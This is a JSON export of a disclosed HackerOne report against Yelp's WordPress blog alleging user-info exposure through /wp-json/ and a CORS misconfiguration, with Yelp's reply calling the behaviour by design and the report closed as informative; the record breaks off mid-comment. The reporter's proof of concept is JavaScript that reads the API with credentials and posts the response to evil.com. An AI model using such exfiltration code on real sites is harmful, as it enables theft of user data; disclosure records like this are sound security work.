@@ -1,0 +1,465 @@
+{
+    "id": 779656,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Nzk2NTY=",
+    "url": "https://hackerone.com/reports/779656",
+    "title": "Multiple Vulnerabilities in (*.blog.yelp.com) - Leakage user admin Sensitive Exposure",
+    "state": "Closed",
+    "substate": "informative",
+    "readable_substate": "Informative",
+    "created_at": "2020-01-21T19:04:03.458Z",
+    "submitted_at": "2020-01-21T19:04:03.458Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": true,
+        "username": "sourceflow",
+        "url": "/sourceflow",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/oSheUgan3kyusfKqtzs71wLr/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 545,
+        "url": "https://hackerone.com/yelp",
+        "handle": "yelp",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Yelp",
+            "twitter_handle": "",
+            "website": "https://www.yelp.com",
+            "about": "Connecting people to great local businesses in communities around the world."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": true,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2020-01-29T19:42:39.088Z",
+    "bug_reporter_agreed_on_going_public_at": "2020-01-29T19:35:29.499Z",
+    "team_member_agreed_on_going_public_at": "2020-01-29T19:42:38.998Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "**Hi!** Team @yelp, We Found Multiple Vulnerabilities in you websites , Username Admin Login Sensitive Exposure\nRefferals Hackerone [#753725]\n\nPlatform(s) Affected: [website]\n*. https://blog.yelp.com/wp-json/ ``user-admin sensitive exposure``\n*. https://blog.yelp.com/wp-login.php ``Admin-Page disclousure``\n\n##Steps To Reproduce:\n1) Open URL Vulnerable : https://blog.yelp.com/wp-json/\n**Request**\n```\nGET /wp-json/ HTTP/1.1\nHost: blog.yelp.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nOrigin: http://127.0.0.1:8080\nDNT: 1\nConnection: close\nCookie: __cfduid=dc46e8e6b98de504f3f044d1b9b3b8a191579632970\nUpgrade-Insecure-Requests: 1\n```\n**Vulnerable Details**\nAdd Parameter ``Origin`` in Request Header\n``Origin`` http://127.0.0.1:8080\n**Exploit Cross Origin Resource Sharing Misconfiguration**\n```javascript\n<!DOCTYPE html>\n<html>\n<body>\n<center>\n<h3>Steal customer data!</h3>\n<html>\n<body>\n<button type='button' onclick='cors()'>Exploit</button>\n<p id='demo'></p>\n<script>\nfunction cors() {\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\nif (this.readyState == 4 && this.status == 200) {\nvar a = this.responseText; // Sensitive data from blog.yelp.com about user account\ndocument.getElementById(\"demo\").innerHTML = a;\nxhttp.open(\"POST\", \"http://evil.com\", true);// Sending that data to Attacker's website\nxhttp.withCredentials = true;\nconsole.log(a);\nxhttp.send(\"data=\"+a);\n}\n};\nxhttp.open(\"GET\", \"https://blog.yelp.com/wp-json/\", true);\nxhttp.withCredentials = true;\nxhttp.send();\n}\n</script>\n</body>\n</html>\n```\n2) save file as ``.html`` , and open in your browser\n3) **Boom** Sensitive has been Exposure\n\n**Additional information**\n```javascript\n\t\nname\t\"Yelp\"\ndescription\t\"Official Blog\"\nurl\t\"https://blog.yelp.com\"\nhome\t\"https://blog.yelp.com\"\ngmt_offset\t-8\ntimezone_string\t\"America/Los_Angeles\"\nnamespaces\t[…]\nauthentication\t[]\nroutes\t\n/\t{…}\n/oembed/1.0\t{…}\n/oembed/1.0/embed\t{…}\n/oembed/1.0/proxy\t{…}\n//wpe_sign_on_plugin/v1\t{…}\n/wpe_sign_on_plugin/v1/login\t{…}\n/redirection/v1\t{…}\n/redirection/v1/redirect\t{…}\n/redirection/v1/redirect/(?P<id>[\\d]+)\t{…}\n/redirection/v1/bulk/redirect/(?P<bulk>delete|enable|disable|reset)\t{…}\n/redirection/v1/group\t{…}\n/redirection/v1/group/(?P<id>[\\d]+)\t{…}\n/redirection/v1/bulk/group/(?P<bulk>delete|enable|disable)\t{…}\n/redirection/v1/log\t{…}\n/redirection/v1/bulk/log/(?P<bulk>delete)\t{…}\n/redirection/v1/404\t{…}\n/redirection/v1/bulk/404/(?P<bulk>delete)\t{…}\n/redirection/v1/setting\t{…}\n/redirection/v1/plugin\t{…}\n/redirection/v1/plugin/delete\t{…}\n/redirection/v1/plugin/test\t{…}\n/redirection/v1/plugin/post\t{…}\n/redirection/v1/plugin/database\t{…}\n/redirection/v1/import/file/(?P<group_id>\\d+)\t{…}\n/redirection/v1/import/plugin\t{…}\n/redirection/v1/import/plugin/(?P<plugin>.*?)\t{…}\n/redirection/v1/export/(?P<module>1|2|3|all)/(?P<format>csv|apache|nginx|json)\t{…}\n/yoast/v1\t{…}\n/yoast/v1/configurator\t{…}\n/yoast/v1/reindex_posts\t{…}\n/yoast/v1/ryte\t{…}\n/yoast/v1/indexables/(?P<object_type>\\w+)/(?P<object_id>\\d+)\t{…}\n/yoast/v1/file_size\t{…}\n/yoast/v1/statistics\t{…}\n/yoast/v1/myyoast\t{…}\n/yoast/v1/myyoast/connect\t{…}\n/wp-rest-api-log\t{…}\n/wp-rest-api-log/entries\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)\t{…}\n/wp-rest-api-log/entry\t{…}\n/wp-rest-api-log/routes\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>request)/(?P<property>body_params)/download\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>request)/(?P<property>query_params)/download\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>request)/(?P<property>body)/download\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>request)/(?P<property>headers)/download\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>response)/(?P<property>body)/download\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>response)/(?P<property>headers)/download\t{…}\n/metaslider/v1\t{…}\n/metaslider/v1/slideshow/all\t{…}\n/metaslider/v1/slideshow/preview\t{…}\n/metaslider/v1/slideshow/save\t{…}\n/metaslider/v1/slideshow/delete\t{…}\n/metaslider/v1/slideshow/duplicate\t{…}\n/metaslider/v1/themes/all\t{…}\n/metaslider/v1/themes/custom\t{…}\n/metaslider/v1/themes/set\t{…}\n/metaslider/v1/import/images\t{…}\n/metaslider/v1/tour/status\t{…}\n/metaslider/v1/settings/save-single\t{…}\n/metaslider/v1/settings/save-global\t{…}\n/regenerate-thumbnails/v1\t{…}\n/regenerate-thumbnails/v1/regenerate/(?P<id>[\\d]+)\t{…}\n/regenerate-thumbnails/v1/attachmentinfo/(?P<id>[\\d]+)\t{…}\n/regenerate-thumbnails/v1/featuredimages\t{…}\n/wp/v2\t{…}\n/wp/v2/posts\t{…}\n/wp/v2/posts/(?P<id>[\\d]+)\t{…}\n/wp/v2/posts/(?P<parent>[\\d]+)/revisions\t{…}\n/wp/v2/posts/(?P<parent>[\\d]+)/revisions/(?P<id>[\\d]+)\t{…}\n/wp/v2/posts/(?P<id>[\\d]+)/autosaves\t{…}\n/wp/v2/posts/(?P<parent>[\\d]+)/autosaves/(?P<id>[\\d]+)\t{…}\n/wp/v2/pages\t{…}\n/wp/v2/pages/(?P<id>[\\d]+)\t{…}\n/wp/v2/pages/(?P<parent>[\\d]+)/revisions\t{…}\n/wp/v2/pages/(?P<parent>[\\d]+)/revisions/(?P<id>[\\d]+)\t{…}\n/wp/v2/pages/(?P<id>[\\d]+)/autosaves\t{…}\n/wp/v2/pages/(?P<parent>[\\d]+)/autosaves/(?P<id>[\\d]+)\t{…}\n/wp/v2/media\t{…}\n/wp/v2/media/(?P<id>[\\d]+)\t{…}\n/wp/v2/blocks\t{…}\n/wp/v2/blocks/(?P<id>[\\d]+)\t{…}\n/wp/v2/blocks/(?P<id>[\\d]+)/autosaves\t{…}\n/wp/v2/blocks/(?P<parent>[\\d]+)/autosaves/(?P<id>[\\d]+)\t{…}\n/wp/v2/wp-rest-api-log\t{…}\n/wp/v2/wp-rest-api-log/(?P<id>[\\d]+)\t{…}\n/wp/v2/wp-rest-api-log/(?P<id>[\\d]+)/autosaves\t{…}\n/wp/v2/wp-rest-api-log/(?P<parent>[\\d]+)/autosaves/(?P<id>[\\d]+)\t{…}\n/wp/v2/types\t{…}\n/wp/v2/types/(?P<type>[\\w-]+)\t{…}\n/wp/v2/statuses\t{…}\n/wp/v2/statuses/(?P<status>[\\w-]+)\t{…}\n/wp/v2/taxonomies\t{…}\n/wp/v2/taxonomies/(?P<taxonomy>[\\w-]+)\t{…}\n/wp/v2/categories\t{…}\n/wp/v2/categories/(?P<id>[\\d]+)\t{…}\n/wp/v2/tags\t{…}\n/wp/v2/tags/(?P<id>[\\d]+)\t{…}\n/wp/v2/users\t{…}\n/wp/v2/users/(?P<id>[\\d]+)\t{…}\n/wp/v2/users/me\t{…}\n/wp/v2/comments\t{…}\n/wp/v2/comments/(?P<id>[\\d]+)\t{…}\n/wp/v2/search\t{…}\n/wp/v2/block-renderer/(?P<name>core/block)\t{…}\n/wp/v2/block-renderer/(?P<name>core/latest-comments)\t{…}\n/wp/v2/block-renderer/(?P<name>core/archives)\t{…}\n/wp/v2/block-renderer/(?P<name>core/calendar)\t{…}\n/wp/v2/block-renderer/(?P<name>core/categories)\t{…}\n/wp/v2/block-renderer/(?P<name>core/latest-posts)\t{…}\n/wp/v2/block-renderer/(?P<name>core/rss)\t{…}\n/wp/v2/block-renderer/(?P<name>core/search)\t{…}\n/wp/v2/block-renderer/(?P<name>core/shortcode)\t{…}\n/wp/v2/block-renderer/(?P<name>core/tag-cloud)\t{…}\n/wp/v2/settings\t{…}\n/wp/v2/themes\t{…}\n_links\t{…}\n```\n##POC Screenshots/Videos:\n  * F691740\n  * F691742\n  * F691741\n\n## Impact\n\n1. This website using Wordpress , so developer forget to disable the link that can view information of admin user. By access to this link, attacker can get all username and other information of user admin: Wordpress user admin sensitive-exposure\n2. Cross Origin Resource Sharing Misconfiguration",
+    "weakness": {
+        "id": 65,
+        "name": "Business Logic Errors"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 691740,
+            "file_name": "ScreenshotsYelpPOC1.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dHVG6YvQSFPLzj4CA8m2dYxD?response-content-disposition=attachment%3B%20filename%3D%22ScreenshotsYelpPOC1.png%22%3B%20filename%2A%3DUTF-8%27%27ScreenshotsYelpPOC1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3ANTHS73%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072611Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB8bLtuWLhLBe36bBDJ6rAPBxu7h%2BdoaAlbjjFCdsiO7AiEA54Z5DY5SyvrmX6uvJPAY7k5KQ8nBix8MlWqmdugzh10quwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDG977bh6X7R1EZQc8CqPBQSRFc6bgzWvfNLi0m2xGvPNUjseer1P%2Fd1SfKMdBcL2sZpI8B28aHJpC9VhOh%2B7R2okvs3wBV%2FRaXq4asfxsKY8yRdI2%2BoqO7UhDFUSDF%2BH5VvZgduO7xgl%2BcIHDbuINU8UY8X4qfS%2F0ywWG2B27GZZY1g1Ogmr6TOGbhilybHM51KAh4DFHcRrP%2FSfKJzTTbKnyJ9Wthnt8vOonzvP4J0C7KH15JJQGJz%2F8kIKDfV1zGdbpGIqk1IiucZWVEyQ%2BNwalzT4J8TOD0Bn1iMpYOiqlUAWPvqRSXJU3XDHEZUEHuXIhmWwAj7cfa9Wx3Qjzfvlck5EsgASHhy2gwI0TDLRFv199LATv6zV4aTZznyStpeqnzgz2ftoucqM4euk0wFg205gJlrVyYqLSKwWI6pljtn%2BCEKw7k%2BIl6ViKrs%2Bqi0iLkMQZJIIjDJxW8aSs%2F0OWGOrjm5MBX9jz55BlNxIQoT2VRmH1tp0Ex1kt10ARv1MHz8FzVj4zaX4SCovejtDRUm8mmcwcb%2BuFkWtF5kzLe91%2BcFfqgMAcgZ7UxSr3ajLIKuzBee0JvczodfaF3DMNWp8yoMPBEcdUc5zpNB%2FO%2FkLe8EFHhk%2BkNd%2Bv14xAkCVjBGeM1K1NZpaRC0dIccvIkQjaeSreLVyRdrNepeIKVWbnPy8gobjAdpHUlLCvE7mLqzZQHDvx4icA7xB91uI8xdKl6X68uKHbEZN4gvc1rq16vo3AUrEP6QwMfWUHQ6PDWef8vv5vCROnAJ472B8xrWK%2BOA%2FRzSQijjfvSbGiaxAsm2Bd9IH37OU35nBplokROIvNIpTWe90%2BRkL73IFI8QQbvtE47uf%2F4h%2FWEeSLy1677qofdP3UHXD0Tow2K%2B2pwY6sQGx8ON%2Fbs3%2BVDYEcInzDPiuuY2x95R8Wn4gf4dRJVl%2BaTCWAhObov3wooNwxzGOv3%2F2ulWcRg8EB6l9i1c1DrOHg3nj7ydP5nh%2BfXp9I3i%2BsR5rT%2BV%2FZiA1tYDir94IvYVyfsyu3b3l8dErmsDQ2DTcHnBUFiBNgHOKuNATRkNPYChY5ZvHGumdhAyae4kJctm2vTwKRFYI6K2YK00uFtzOPgBk4b5PFWa7e64VdTgGu%2Fg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bd22e20d1f6ab10b3dd5759c5688e8d814dbe82d65aef039b08151a0707c2b07",
+            "file_size": 46815,
+            "type": "image/png"
+        },
+        {
+            "id": 691741,
+            "file_name": "ScreenshotsYelpPOC.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Dv3DJdtCxp7RwgSYvPyWeB7r?response-content-disposition=attachment%3B%20filename%3D%22ScreenshotsYelpPOC.png%22%3B%20filename%2A%3DUTF-8%27%27ScreenshotsYelpPOC.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3ANTHS73%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072611Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB8bLtuWLhLBe36bBDJ6rAPBxu7h%2BdoaAlbjjFCdsiO7AiEA54Z5DY5SyvrmX6uvJPAY7k5KQ8nBix8MlWqmdugzh10quwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDG977bh6X7R1EZQc8CqPBQSRFc6bgzWvfNLi0m2xGvPNUjseer1P%2Fd1SfKMdBcL2sZpI8B28aHJpC9VhOh%2B7R2okvs3wBV%2FRaXq4asfxsKY8yRdI2%2BoqO7UhDFUSDF%2BH5VvZgduO7xgl%2BcIHDbuINU8UY8X4qfS%2F0ywWG2B27GZZY1g1Ogmr6TOGbhilybHM51KAh4DFHcRrP%2FSfKJzTTbKnyJ9Wthnt8vOonzvP4J0C7KH15JJQGJz%2F8kIKDfV1zGdbpGIqk1IiucZWVEyQ%2BNwalzT4J8TOD0Bn1iMpYOiqlUAWPvqRSXJU3XDHEZUEHuXIhmWwAj7cfa9Wx3Qjzfvlck5EsgASHhy2gwI0TDLRFv199LATv6zV4aTZznyStpeqnzgz2ftoucqM4euk0wFg205gJlrVyYqLSKwWI6pljtn%2BCEKw7k%2BIl6ViKrs%2Bqi0iLkMQZJIIjDJxW8aSs%2F0OWGOrjm5MBX9jz55BlNxIQoT2VRmH1tp0Ex1kt10ARv1MHz8FzVj4zaX4SCovejtDRUm8mmcwcb%2BuFkWtF5kzLe91%2BcFfqgMAcgZ7UxSr3ajLIKuzBee0JvczodfaF3DMNWp8yoMPBEcdUc5zpNB%2FO%2FkLe8EFHhk%2BkNd%2Bv14xAkCVjBGeM1K1NZpaRC0dIccvIkQjaeSreLVyRdrNepeIKVWbnPy8gobjAdpHUlLCvE7mLqzZQHDvx4icA7xB91uI8xdKl6X68uKHbEZN4gvc1rq16vo3AUrEP6QwMfWUHQ6PDWef8vv5vCROnAJ472B8xrWK%2BOA%2FRzSQijjfvSbGiaxAsm2Bd9IH37OU35nBplokROIvNIpTWe90%2BRkL73IFI8QQbvtE47uf%2F4h%2FWEeSLy1677qofdP3UHXD0Tow2K%2B2pwY6sQGx8ON%2Fbs3%2BVDYEcInzDPiuuY2x95R8Wn4gf4dRJVl%2BaTCWAhObov3wooNwxzGOv3%2F2ulWcRg8EB6l9i1c1DrOHg3nj7ydP5nh%2BfXp9I3i%2BsR5rT%2BV%2FZiA1tYDir94IvYVyfsyu3b3l8dErmsDQ2DTcHnBUFiBNgHOKuNATRkNPYChY5ZvHGumdhAyae4kJctm2vTwKRFYI6K2YK00uFtzOPgBk4b5PFWa7e64VdTgGu%2Fg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=37ce3e1b59e95e12d31b7fa67af4be3fbcd48d60988401f9804f630c93d17c84",
+            "file_size": 368579,
+            "type": "image/png"
+        },
+        {
+            "id": 691742,
+            "file_name": "ScreenshotsYelpPOC2.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/B49WhxwNCJTiekeuLTsvF1bQ?response-content-disposition=attachment%3B%20filename%3D%22ScreenshotsYelpPOC2.png%22%3B%20filename%2A%3DUTF-8%27%27ScreenshotsYelpPOC2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3ANTHS73%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072611Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB8bLtuWLhLBe36bBDJ6rAPBxu7h%2BdoaAlbjjFCdsiO7AiEA54Z5DY5SyvrmX6uvJPAY7k5KQ8nBix8MlWqmdugzh10quwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDG977bh6X7R1EZQc8CqPBQSRFc6bgzWvfNLi0m2xGvPNUjseer1P%2Fd1SfKMdBcL2sZpI8B28aHJpC9VhOh%2B7R2okvs3wBV%2FRaXq4asfxsKY8yRdI2%2BoqO7UhDFUSDF%2BH5VvZgduO7xgl%2BcIHDbuINU8UY8X4qfS%2F0ywWG2B27GZZY1g1Ogmr6TOGbhilybHM51KAh4DFHcRrP%2FSfKJzTTbKnyJ9Wthnt8vOonzvP4J0C7KH15JJQGJz%2F8kIKDfV1zGdbpGIqk1IiucZWVEyQ%2BNwalzT4J8TOD0Bn1iMpYOiqlUAWPvqRSXJU3XDHEZUEHuXIhmWwAj7cfa9Wx3Qjzfvlck5EsgASHhy2gwI0TDLRFv199LATv6zV4aTZznyStpeqnzgz2ftoucqM4euk0wFg205gJlrVyYqLSKwWI6pljtn%2BCEKw7k%2BIl6ViKrs%2Bqi0iLkMQZJIIjDJxW8aSs%2F0OWGOrjm5MBX9jz55BlNxIQoT2VRmH1tp0Ex1kt10ARv1MHz8FzVj4zaX4SCovejtDRUm8mmcwcb%2BuFkWtF5kzLe91%2BcFfqgMAcgZ7UxSr3ajLIKuzBee0JvczodfaF3DMNWp8yoMPBEcdUc5zpNB%2FO%2FkLe8EFHhk%2BkNd%2Bv14xAkCVjBGeM1K1NZpaRC0dIccvIkQjaeSreLVyRdrNepeIKVWbnPy8gobjAdpHUlLCvE7mLqzZQHDvx4icA7xB91uI8xdKl6X68uKHbEZN4gvc1rq16vo3AUrEP6QwMfWUHQ6PDWef8vv5vCROnAJ472B8xrWK%2BOA%2FRzSQijjfvSbGiaxAsm2Bd9IH37OU35nBplokROIvNIpTWe90%2BRkL73IFI8QQbvtE47uf%2F4h%2FWEeSLy1677qofdP3UHXD0Tow2K%2B2pwY6sQGx8ON%2Fbs3%2BVDYEcInzDPiuuY2x95R8Wn4gf4dRJVl%2BaTCWAhObov3wooNwxzGOv3%2F2ulWcRg8EB6l9i1c1DrOHg3nj7ydP5nh%2BfXp9I3i%2BsR5rT%2BV%2FZiA1tYDir94IvYVyfsyu3b3l8dErmsDQ2DTcHnBUFiBNgHOKuNATRkNPYChY5ZvHGumdhAyae4kJctm2vTwKRFYI6K2YK00uFtzOPgBk4b5PFWa7e64VdTgGu%2Fg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e4c0acac0027c0110ed05434a898af127f67a1aa445483ce884a8b2f00996e47",
+            "file_size": 100483,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 20,
+    "voters": [
+        "tess",
+        "exception",
+        "elmahdibenrais-",
+        "sourceflow",
+        "lmhu",
+        "0xm1racle",
+        "0xrobot",
+        "system_vuln",
+        "iftek",
+        "akkyda00",
+        "and 10 more..."
+    ],
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 6832115,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportCollaboratorInvited",
+            "message": null,
+            "automated_response": false,
+            "created_at": "2020-01-21T19:55:18.305Z",
+            "updated_at": "2020-01-21T19:55:18.305Z",
+            "actor": {
+                "username": "sourceflow",
+                "cleared": false,
+                "verified": false,
+                "url": "/sourceflow",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oSheUgan3kyusfKqtzs71wLr/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6832476,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportCollaboratorJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-01-21T20:28:10.632Z",
+            "updated_at": "2020-01-21T20:28:10.632Z",
+            "actor": {
+                "username": "deb0con",
+                "cleared": false,
+                "verified": false,
+                "url": "/deb0con",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/uuzgbpy0admz05sef76979ln16oc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6832495,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "**Hi!** Team security @yelp,\nWe can get information about the users registered (such as: id, name, login name, etc.) and employees of Yelp without authentication on\n\nRefferals Hackerone Reports :: [#753725](https://hackerone.com/reports/753725)",
+            "automated_response": false,
+            "created_at": "2020-01-21T20:30:23.312Z",
+            "updated_at": "2020-01-21T20:30:23.312Z",
+            "actor": {
+                "username": "deb0con",
+                "cleared": false,
+                "verified": false,
+                "url": "/deb0con",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/uuzgbpy0admz05sef76979ln16oc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6832917,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi there!\n\nThanks for submitting your report to us! Please expect a response within a week.\n\nBest,\nThe Yelp Security Team\n",
+            "automated_response": true,
+            "created_at": "2020-01-21T21:00:49.917Z",
+            "updated_at": "2020-01-21T21:00:49.917Z",
+            "actor": {
+                "url": "/yelp",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Yelp"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6871670,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "**Hi!** Team security @yelp , Any Update ??,\nCan we **[#Triaged]**",
+            "automated_response": false,
+            "created_at": "2020-01-25T18:40:31.286Z",
+            "updated_at": "2020-01-25T18:40:31.286Z",
+            "actor": {
+                "username": "sourceflow",
+                "cleared": false,
+                "verified": false,
+                "url": "/sourceflow",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oSheUgan3kyusfKqtzs71wLr/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6886720,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNeedsMoreInfo",
+            "message": "HI @bellpwn,\n\nCan you elaborate more on the perceived risk of the issues?\n\nThe existence of an admin login page by itself does not carry any risk. \n\nThe contents of our Wordpress blog are intended to be public. The Wordpress API includes the use of nonces / CSRF tokens for state changing requests. The inclusion of the request origin in the `Access-Control-Allow-Origin` header is by design. I assume your instructions on adding `Origin` to the request are a way of simulating a page served from a web server since a normal XHR request can't set that.\n\nhttps://developer.wordpress.org/rest-api/frequently-asked-questions/#why-is-the-rest-api-not-verifying-the-incoming-origin-header-does-this-expose-my-site-to-csrf-attacks\n\nhttps://github.com/WordPress/WordPress/blob/cf249b07ed0517240ed61656bc340e271ba33a0c/wp-includes/rest-api.php#L580\n\nDavid",
+            "automated_response": false,
+            "created_at": "2020-01-27T23:22:09.769Z",
+            "updated_at": "2020-01-27T23:22:09.769Z",
+            "actor": {
+                "username": "dchan",
+                "cleared": false,
+                "verified": false,
+                "url": "/dchan",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6890640,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "**Hi!** Security Team @dchan ,\nWordpress User Admin Disclousure & Wordpress restApi Disclousure in ``WP-JSON``\nattacker can leads to **CORS-Exploit** with sensitive information \n\nPOC 1 : F691742\nPOC 2: F698578",
+            "automated_response": false,
+            "created_at": "2020-01-28T12:59:37.207Z",
+            "updated_at": "2020-01-28T12:59:37.207Z",
+            "actor": {
+                "username": "deb0con",
+                "cleared": false,
+                "verified": false,
+                "url": "/deb0con",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/uuzgbpy0admz05sef76979ln16oc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 698578,
+                    "filename": "POC2.png",
+                    "type": "image/png",
